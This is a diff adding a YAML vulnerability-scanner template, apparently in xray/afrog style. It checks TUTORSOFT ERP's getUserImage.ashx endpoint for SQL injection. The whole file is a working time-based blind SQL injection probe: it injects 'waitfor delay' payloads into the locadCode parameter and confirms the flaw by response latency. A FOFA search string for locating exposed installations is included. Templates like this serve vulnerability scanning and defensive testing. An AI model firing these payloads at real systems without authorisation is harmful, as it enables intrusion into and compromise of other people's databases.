@@ -1,0 +1,50 @@
+id: tutorsoft-erp-getUserImage-sqli
+info:
+  name: TUTORSOFT ERP getUserImage.ashx SQL Injection
+  author: ZacharyZcR
+  severity: high
+  verified: true
+  description: |
+    TUTORSOFT ERP getUserImage.ashx interface has SQL injection vulnerability.
+    An attacker can execute arbitrary SQL statements by injecting malicious code into the locadCode parameter.
+    FOFA: app="TUTORSOFT-ERP"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%9D%9C%E7%89%B9%E7%BD%91/%E6%9D%9C%E7%89%B9%E7%BD%91%E4%B8%8A%E8%AE%A2%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetUserImage.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tutorsoft,erp,sqli
+  created: 2024/12/31
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:10
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r1:
+    request:
+      method: GET
+      path: /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:6
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r2:
+    request:
+      method: GET
+      path: /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:10
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r3:
+    request:
+      method: GET
+      path: /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:6
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+
+expression: r0() && r1() && r2() && r3()
